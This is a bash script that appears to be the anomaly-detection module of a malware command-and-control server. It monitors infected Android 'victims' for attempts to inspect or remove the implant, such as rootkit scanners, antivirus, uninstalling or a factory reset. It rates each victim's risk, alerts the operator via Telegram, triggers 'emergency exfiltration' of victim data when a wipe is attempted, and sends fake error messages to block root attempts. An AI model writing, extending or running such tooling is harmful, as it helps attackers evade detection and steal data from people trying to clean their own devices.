#!/bin/bash
# ============================================
# APT ANOMALY DETECTOR v1.0
# Suspicious Activity | Telegram Alerts | Auto-Response
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

VICTIM_DIR="$HOME/c2_server/victims"
LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"
ALERT_LOG="$LOG_DIR/anomaly_alerts.log"

mkdir -p "$VICTIM_DIR" "$LOG_DIR" "$CONFIG_DIR"

# === TELEGRAM CONFIGURATION ===
setup_telegram() {
    echo -e "\n${CYAN}[Telegram Bot Setup]${NC}"
    echo -e "${YELLOW}Get Bot Token from @BotFather on Telegram${NC}"
    echo -ne "Bot Token: "
    read -r bot_token
    echo -ne "Chat ID (your Telegram ID): "
    read -r chat_id
    
    cat > "$CONFIG_DIR/telegram.conf" << CONF
BOT_TOKEN=$bot_token
CHAT_ID=$chat_id
CONF
    
    echo -e "${GREEN}[+]${NC} Telegram configured!"
    
    # Send test message
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$chat_id" \
        -d "text=✅ APT C2 Anomaly Detector Online" >/dev/null 2>&1
    
    echo -e "${GREEN}[+]${NC} Test message sent!"
}

# === SEND TELEGRAM ALERT ===
send_alert() {
    local level="$1"
    local victim_id="$2"
    local message="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Load config
    [ -f "$CONFIG_DIR/telegram.conf" ] && source "$CONFIG_DIR/telegram.conf"
    
    local emoji=""
    case $level in
        critical) emoji="🔴🔴🔴" ;;
        high) emoji="🔴🔴" ;;
        medium) emoji="🟡" ;;
        low) emoji="🟢" ;;
    esac
    
    local alert_text="$emoji ALERT: $level
────────────────
Victim: $victim_id
Time: $timestamp
$message"
    
    # Log locally
    echo "[$timestamp] [$level] $victim_id — $message" >> "$ALERT_LOG"
    
    # Send to Telegram
    if [ -n "$BOT_TOKEN" ] && [ -n "$CHAT_ID" ]; then
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d "chat_id=$CHAT_ID" \
            -d "text=$alert_text" \
            -d "parse_mode=HTML" >/dev/null 2>&1
    fi
    
    # Console output
    case $level in
        critical) echo -e "${RED}$alert_text${NC}" ;;
        high) echo -e "${RED}$alert_text${NC}" ;;
        medium) echo -e "${YELLOW}$alert_text${NC}" ;;
        low) echo -e "${GREEN}$alert_text${NC}" ;;
    esac
}

# === SUSPICIOUS PATTERNS DATABASE ===
declare -A SUSPICIOUS_PATTERNS=(
    ["ps aux"]="Process listing detected"
    ["ps -ef"]="Process listing detected"
    ["netstat"]="Network monitoring attempt"
    ["ifconfig"]="Network interface check"
    ["ls /data"]="Filesystem exploration"
    ["cat /etc/shadow"]="Password file access attempt"
    ["rm -rf"]="File deletion attempt"
    ["kill"]="Process termination attempt"
    ["su root"]="Root escalation attempt"
    ["sudo"]="Privilege escalation attempt"
    ["tcpdump"]="Packet capture attempt"
    ["wireshark"]="Network analysis tool"
    ["nmap"]="Network scanner detected"
    ["chkrootkit"]="Rootkit scanner detected"
    ["rkhunter"]="Rootkit hunter detected"
    ["clamav"]="Antivirus scan"
    ["uninstall"]="Application removal attempt"
    ["factory reset"]="Device wipe attempt"
    ["adb uninstall"]="ADB removal attempt"
)

# === SUSPICIOUS FILE ACCESS PATTERNS ===
declare -A SUSPICIOUS_FILES=(
    ["/data/data/com.virbo.app"]="normal"
    ["/data/data/com.android.settings"]="suspicious"
    ["/system/build.prop"]="suspicious"
    ["/proc/cpuinfo"]="suspicious"
    ["/etc/hosts"]="suspicious"
)

# === SCAN FOR ANOMALIES ===
scan_victim_activity() {
    local victim_id="$1"
    local activity_file="$VICTIM_DIR/$victim_id/logs/commands.log"
    
    [ ! -f "$activity_file" ] && return
    
    echo -e "${CYAN}[*]${NC} Scanning $victim_id for anomalies..."
    
    local last_scan=$(cat "$VICTIM_DIR/$victim_id/.last_scan" 2>/dev/null || echo 0)
    local current_size=$(wc -c < "$activity_file" 2>/dev/null || echo 0)
    
    # Only scan new content
    if [ "$current_size" -gt "$last_scan" ]; then
        tail -c +$((last_scan + 1)) "$activity_file" | while IFS= read -r line; do
            # Check against suspicious patterns
            for pattern in "${!SUSPICIOUS_PATTERNS[@]}"; do
                if echo "$line" | grep -qi "$pattern"; then
                    local risk_level="high"
                    
                    # Adjust risk based on pattern
                    case $pattern in
                        "rm -rf"|"factory reset"|"su root") risk_level="critical" ;;
                        "ps aux"|"netstat"|"ifconfig") risk_level="medium" ;;
                    esac
                    
                    send_alert "$risk_level" "$victim_id" "${SUSPICIOUS_PATTERNS[$pattern]}"
                    
                    # Update victim risk score
                    update_risk_score "$victim_id" "$risk_level"
                    
                    # Auto-response for critical
                    [ "$risk_level" = "critical" ] && auto_respond "$victim_id" "$pattern"
                fi
            done
        done
    fi
    
    echo "$current_size" > "$VICTIM_DIR/$victim_id/.last_scan"
}

# === UPDATE RISK SCORE ===
update_risk_score() {
    local victim_id="$1"
    local level="$2"
    local info_file="$VICTIM_DIR/$victim_id/info.json"
    
    [ ! -f "$info_file" ] && return
    
    local score_map=("low:1" "medium:2" "high:3" "critical:5")
    local current_score=$(grep -o '"risk_value": [0-9]*' "$info_file" 2>/dev/null | grep -o '[0-9]*' || echo 0)
    
    local add_score=1
    case $level in
        critical) add_score=5 ;;
        high) add_score=3 ;;
        medium) add_score=2 ;;
    esac
    
    local new_score=$((current_score + add_score))
    
    # Update risk value
    if grep -q "risk_value" "$info_file"; then
        sed -i "s/\"risk_value\": [0-9]*/\"risk_value\": $new_score/" "$info_file"
    else
        sed -i "s/\"risk_score\": \"[a-z]*\"/\"risk_score\": \"yellow\", \"risk_value\": $new_score/" "$info_file"
    fi
    
    # Update color based on score
    local new_color="green"
    [ "$new_score" -ge 10 ] && new_color="red"
    [ "$new_score" -ge 5 ] && [ "$new_score" -lt 10 ] && new_color="yellow"
    
    sed -i "s/\"risk_score\": \"[a-z]*\"/\"risk_score\": \"$new_color\"/" "$info_file"
    
    echo -e "${YELLOW}[!]${NC} $victim_id risk score updated to $new_score ($new_color)"
}

# === AUTO-RESPONSE TO CRITICAL THREATS ===
auto_respond() {
    local victim_id="$1"
    local threat="$2"
    
    echo -e "${RED}[AUTO-RESPONSE]${NC} Acting on $victim_id — Threat: $threat"
    
    case $threat in
        "rm -rf"|"factory reset")
            # Emergency data exfil
            echo -e "${RED}[!]${NC} Emergency exfiltration triggered!"
            bash ~/c2_server/modules/data_collect/data_harvester.sh "$victim_id" 2>/dev/null
            
            # Kill connection
            echo -e "${RED}[!]${NC} Terminating $victim_id connection..."
            echo "terminate" > "$VICTIM_DIR/$victim_id/.control"
            
            send_alert "critical" "$victim_id" "AUTO-TERMINATED: $threat attempt detected"
            ;;
        "su root"|"sudo")
            # Send fake error
            echo "bash: su: command not found" | nc -w 1 localhost 4444 2>/dev/null
            
            send_alert "high" "$victim_id" "Root attempt blocked: $threat"
            ;;
        "nmap"|"tcpdump"|"wireshark")
            # Deploy decoy
            send_alert "medium" "$victim_id" "Network scanning detected — deploying decoy"
            ;;
    esac
}

# === VICTIM ACTIVITY LOG VIEWER ===
view_anomaly_log() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   🔍 ANOMALY DETECTION LOG          ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    echo ""
    
    if [ -f "$ALERT_LOG" ]; then
        echo -e "${RED}[Critical & High]${NC}"
        grep -E "critical|high" "$ALERT_LOG" | tail -15
        echo ""
        echo -e "${YELLOW}[Medium]${NC}"
        grep "medium" "$ALERT_LOG" | tail -5
    else
        echo -e "${GREEN}[+]${NC} No anomalies detected yet"
    fi
}

# === VICTIM RISK DASHBOARD ===
risk_dashboard() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                   ⚠️ RISK DASHBOARD                          ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    printf "%-15s %-12s %-10s %-20s\n" "Victim" "Risk Score" "Color" "Last Alert"
    echo "────────────────────────────────────────────────────────────────────"
    
    for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
        [ -d "$victim_folder" ] || continue
        
        local id=$(basename "$victim_folder")
        local score=$(grep -o '"risk_value": [0-9]*' "$victim_folder/info.json" 2>/dev/null | grep -o '[0-9]*' || echo 0)
        local color=$(grep -o '"risk_score": "[a-z]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4 || echo "green")
        local last=$(grep "$id" "$ALERT_LOG" 2>/dev/null | tail -1 | cut -d']' -f1 | tr -d '[')
        
        local color_display=""
        case $color in
            red) color_display="${RED}🔴 HIGH${NC}" ;;
            yellow) color_display="${YELLOW}🟡 MEDIUM${NC}" ;;
            green) color_display="${GREEN}🟢 LOW${NC}" ;;
        esac
        
        printf "%-15s %-12s %-10s %-20s\n" "$id" "$score" "$color_display" "${last:-No alerts}"
    done
}

# === REAL-TIME MONITOR ===
realtime_monitor() {
    echo -e "${GREEN}[+]${NC} Real-time anomaly monitor started"
    echo -e "${YELLOW}[*]${NC} Press Ctrl+C to stop"
    echo ""
    
    while true; do
        for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
            [ -d "$victim_folder" ] || continue
            local victim_id=$(basename "$victim_folder")
            scan_victim_activity "$victim_id"
        done
        sleep 10
    done
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🔍 ANOMALY DETECTOR v1.0  ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╗${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} ⚙️  Setup Telegram Alerts"
        echo -e "  ${GREEN}2)${NC} 🔍 Scan Single Victim"
        echo -e "  ${GREEN}3)${NC} 📡 Real-Time Monitor"
        echo -e "  ${GREEN}4)${NC} 📊 Risk Dashboard"
        echo -e "  ${GREEN}5)${NC} 📋 View Anomaly Logs"
        echo -e "  ${GREEN}6)${NC} 🧪 Test Alert"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) setup_telegram ;;
            2)
                echo -ne "${YELLOW}Victim ID: ${NC}"; read -r vid
                [ -d "$VICTIM_DIR/$vid" ] && scan_victim_activity "$vid" || echo -e "${RED}Not found${NC}"
                ;;
            3) realtime_monitor ;;
            4) risk_dashboard ;;
            5) view_anomaly_log ;;
            6) send_alert "low" "TEST-001" "Test alert — system working" ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
